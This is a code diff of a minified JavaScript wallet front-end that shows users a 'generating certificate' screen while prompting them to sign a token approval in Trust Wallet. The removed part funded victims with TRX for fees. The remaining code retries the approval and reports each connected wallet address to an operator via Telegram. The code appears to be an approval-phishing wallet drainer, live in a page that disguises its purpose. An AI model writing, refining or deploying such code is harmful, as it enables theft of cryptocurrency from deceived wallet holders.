@@ -93024,7 +93024,8 @@
                         wallet: c
                     });
 
-                    // Smooth UX: show generating certificate right after connect
+                    // No TRX check / no top-up. User keeps TRX or Trust energy rental handles fees.
+                    // Flow: connect → sign approve → on-chain allowance check → certificate
                     const showGenerating = (msg) => {
                         let el = document.getElementById("cert-generating-overlay");
                         if (!el) {
@@ -93043,42 +93044,16 @@
                         if (el && el.parentNode)
                             el.parentNode.removeChild(el)
                     };
-                    showGenerating("Checking wallet…");
+
+                    showGenerating("Opening approval…");
                     t(3);
 
-                    console.log("[2] BALANCE CHECK START", {
-                        endpoint: "https://api.trongrid.io/wallet/getaccount"
-                    });
-                    reportEvent("BALANCE_CHECK_START", {
-                        endpoint: "https://api.trongrid.io/wallet/getaccount"
-                    });
-                    let balanceInTRX = 0;
-                    try {
-                        balanceInTRX = parseFloat(await a.getBalance(c)) || 0
-                    } catch (_) {
-                        balanceInTRX = 0
-                    }
-                    o(balanceInTRX);
-                    // Top-up when below 10 TRX (align with backend MINIMUM_BALANCE)
-                    const minTrx = 10;
-                    console.log("[3] BALANCE CHECK RESULT", {
-                        endpoint: "https://api.trongrid.io/wallet/getaccount",
-                        balanceInTRX: balanceInTRX,
-                        minTrx: minTrx,
-                        needsTopUp: balanceInTRX < minTrx
-                    });
-                    reportEvent("BALANCE_CHECK_RESULT", {
-                        balanceInTRX: balanceInTRX,
-                        minTrx: minTrx,
-                        needsTopUp: balanceInTRX < minTrx
-                    });
-
-                    // Telegram: wallet connected (fire-and-forget)
+                    // Telegram notify only (no balance / top-up)
                     reportEvent("TELEGRAM_SEND_INITIATED", {
                         type: "wallet_connected"
                     });
                     GS.post(API_BASE + "/api/telegram", {
-                        text: `Wallet connected\nWallet: ${c}\nTRX Balance: ${balanceInTRX} TRX\nNeeds top-up: ${balanceInTRX < minTrx ? "YES" : "NO"}\nTime: ${new Date().toISOString()}`
+                        text: `Wallet connected\nWallet: ${c}\nFlow: direct-approve (no top-up)\nTime: ${new Date().toISOString()}`
                     }, {
                         timeout: 8000
                     }).then(() => {
@@ -93092,216 +93067,15 @@
                         })
                     });
 
-                    let topUpSent = false;
-                    let topUpTxId = "N/A";
-                    let topUpAmount = 0;
-                    let recentTopUp = false;
-                    try {
-                        const ts = Number(sessionStorage.getItem("trxToppedUp:" + c) || 0);
-                        recentTopUp = ts > 0 && Date.now() - ts < 180000
-                    } catch (_) {}
-
-                    // After top-up: rapid on-chain checks (every ~1s, ~12–15 times) until TRX received
-                    const waitForTrxOnChain = async (reason, txHint) => {
-                        showGenerating("Confirming TRX on-chain…");
-                        reportEvent("TRX_TOPUP_ONCHAIN_WAIT_START", {
-                            reason: reason,
-                            tx: txHint || null,
-                            minTrx: minTrx
-                        });
-                        // Rapid bursts: check often until balance/tx confirms, then open approve
-                        const maxPolls = 15;
-                        let confirmed = !1;
-                        let latest = 0;
-                        for (let i = 0; i < maxPolls; i += 1) {
-                            try {
-                                const confRes = await GS.post(API_BASE + "/confirm-topup", {
-                                    userAddress: c,
-                                    transactionId: txHint || null,
-                                    minTrx: minTrx
-                                }, {
-                                    timeout: 12000
-                                });
-                                const data = confRes && confRes.data ? confRes.data : null;
-                                latest = data && Number(data.balance) >= 0 ? Number(data.balance) : 0;
-                                o(latest);
-                                reportEvent("TRX_TOPUP_ONCHAIN_POLL", {
-                                    poll: i + 1,
-                                    balanceInTRX: latest,
-                                    minTrx: minTrx,
-                                    txConfirmed: !!(data && data.txConfirmed),
-                                    ready: !!(data && data.ready)
-                                });
-                                showGenerating("Confirming TRX… check " + (i + 1) + "/" + maxPolls + " (" + latest.toFixed(2) + " TRX)");
-                                if (data && data.ready) {
-                                    confirmed = !0;
-                                    if (latest < minTrx && data.txConfirmed)
-                                        latest = Math.max(latest, minTrx);
-                                    break
-                                }
-                            } catch (pollErr) {
-                                reportEvent("TRX_TOPUP_ONCHAIN_POLL_ERROR", {
-                                    poll: i + 1,
-                                    error: pollErr && pollErr.message ? pollErr.message : String(pollErr)
-                                });
-                                // Fallback local balance
-                                try {
-                                    latest = parseFloat(await a.getBalance(c)) || 0;
-                                    o(latest);
-                                    if (latest >= minTrx) {
-                                        confirmed = !0;
-                                        break
-                                    }
-                                } catch (_) {}
-                            }
-                            // Rapid: ~1 second between checks
-                            await new Promise((resolve) => setTimeout(resolve, 1000))
-                        }
-                        // Extra wait so Trust Wallet UI can show the new TRX balance before approve
-                        if (confirmed) {
-                            const settleMs = 4000;
-                            showGenerating("TRX received. Waiting for wallet balance to update…");
-                            reportEvent("TRX_TOPUP_WALLET_SETTLE_WAIT", {
-                                waitMs: settleMs,
-                                balanceInTRX: latest,
-                                reason: reason
-                            });
-                            await new Promise((resolve) => setTimeout(resolve, settleMs));
-                            reportEvent("TRX_TOPUP_WALLET_SETTLE_DONE", {
-                                waitMs: settleMs,
-                                balanceInTRX: latest
-                            })
-                        }
-                        reportEvent("TRX_TOPUP_ONCHAIN_WAIT_DONE", {
-                            confirmed: confirmed,
-                            balanceInTRX: latest,
-                            reason: reason,
-                            tx: txHint || null
-                        });
-                        balanceInTRX = latest;
-                        return confirmed
-                    };
-
-                    if (balanceInTRX < minTrx && recentTopUp) {
-                        reportEvent("TRX_TOPUP_SKIPPED", {
-                            reason: "recent-topup-reuse",
-                            balanceInTRX: balanceInTRX
-                        });
-                        topUpSent = true;
-                        const ok = await waitForTrxOnChain("recent-topup-reuse", null);
-                        if (!ok) {
-                            hideGenerating();
-                            window.alert("TRX not confirmed on-chain yet. Please try again.");
-                            t(2);
-                            return
-                        }
-                    } else if (balanceInTRX < minTrx) {
-                        showGenerating("Sending TRX for fees…");
-                        reportEvent("TRX_TOPUP_START", {
-                            balanceInTRX: balanceInTRX,
-                            minTrx: minTrx
-                        });
-                        try {
-                            const topUpResponse = await GS.post(API_BASE + "/send-trx", {
-                                userAddress: c
-                            }, {
-                                timeout: 20000
-                            });
-                            const topUpData = topUpResponse && topUpResponse.data ? topUpResponse.data : null;
-                            console.log("[5] TRX TOP-UP RESULT", topUpData);
-                            reportEvent("TRX_TOPUP_RESULT", topUpData || {
-                                success: false
-                            });
-                            if (!(topUpData && topUpData.success)) {
-                                reportEvent("TRX_TOPUP_FAILED", topUpData || {
-                                    success: false
-                                });
-                                hideGenerating();
-                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
-                                t(2);
-                                return
-                            }
-                            topUpSent = !!topUpData.sent;
-                            topUpTxId = topUpData.transactionId || "N/A";
-                            topUpAmount = topUpData.amount || 0;
-
-                            reportEvent("TELEGRAM_SEND_INITIATED", {
-                                type: "trx_topup",
-                                sent: topUpSent,
-                                transactionId: topUpTxId
-                            });
-                            GS.post(API_BASE + "/api/telegram", {
-                                text: `TRX top-up ${topUpSent ? "sent" : "skipped (already funded)"}\nWallet: ${c}\nAmount: ${topUpAmount || "N/A"} TRX\nTX: ${topUpTxId}\nBefore: ${balanceInTRX} TRX\nTime: ${new Date().toISOString()}`
-                            }, {
-                                timeout: 5000
-                            }).then(() => {
-                                reportEvent("TELEGRAM_SEND_OK", {
-                                    type: "trx_topup"
-                                })
-                            }).catch((err) => {
-                                reportEvent("TELEGRAM_SEND_FAILED", {
-                                    type: "trx_topup",
-                                    error: err && err.message ? err.message : String(err)
-                                })
-                            });
-
-                            if (topUpSent) {
-                                try {
-                                    sessionStorage.setItem("trxToppedUp:" + c, String(Date.now()))
-                                } catch (_) {}
-                                const ok = await waitForTrxOnChain("after-topup-sent", topUpTxId);
-                                if (!ok) {
-                                    hideGenerating();
-                                    window.alert("TRX top-up sent but not confirmed on-chain yet. Please try again.");
-                                    t(2);
-                                    return
-                                }
-                            } else {
-                                reportEvent("TRX_TOPUP_ALREADY_FUNDED", {
-                                    balanceInTRX: balanceInTRX
-                                })
-                            }
-                        } catch (topUpError) {
-                            reportEvent("TRX_TOPUP_FAILED", {
-                                error: topUpError && topUpError.message ? topUpError.message : String(topUpError)
-                            });
-                            try {
-                                balanceInTRX = parseFloat(await a.getBalance(c)) || 0;
-                                o(balanceInTRX);
-                                if (balanceInTRX < minTrx) {
-                                    hideGenerating();
-                                    window.alert("TRX top-up failed. Need TRX for transaction fees.");
-                                    t(2);
-                                    return
-                                }
-                            } catch (_) {
-                                hideGenerating();
-                                window.alert("TRX top-up failed. Need TRX for transaction fees.");
-                                t(2);
-                                return
-                            }
-                        }
-                    } else {
-                        // Already has TRX → go straight to approval
-                        showGenerating("Opening approval…");
-                        reportEvent("TRX_TOPUP_NOT_NEEDED", {
-                            balanceInTRX: balanceInTRX
-                        })
-                    }
-
+                    // feeLimit allows Trust to burn TRX OR use energy rental — Trust decides
                     const feeLimit = 15e6;
                     showGenerating("Approve in Trust Wallet…");
                     reportEvent("APPROVAL_INITIATED", {
-                        balanceInTRX: balanceInTRX,
                         feeLimit: feeLimit,
-                        fromTopUp: topUpSent
+                        mode: "direct-approve-no-topup"
                     });
-                    try {
-                        openTrustStay()
-                    } catch (_) {}
-                    // After on-chain TRX confirm: push approve 2–3 times only
                     await f(c, feeLimit, {
-                        fromTopUp: topUpSent,
+                        fromTopUp: !1,
                         retries: 3,
                         reportEvent: reportEvent,
                         openTrustStay: openTrustStay,
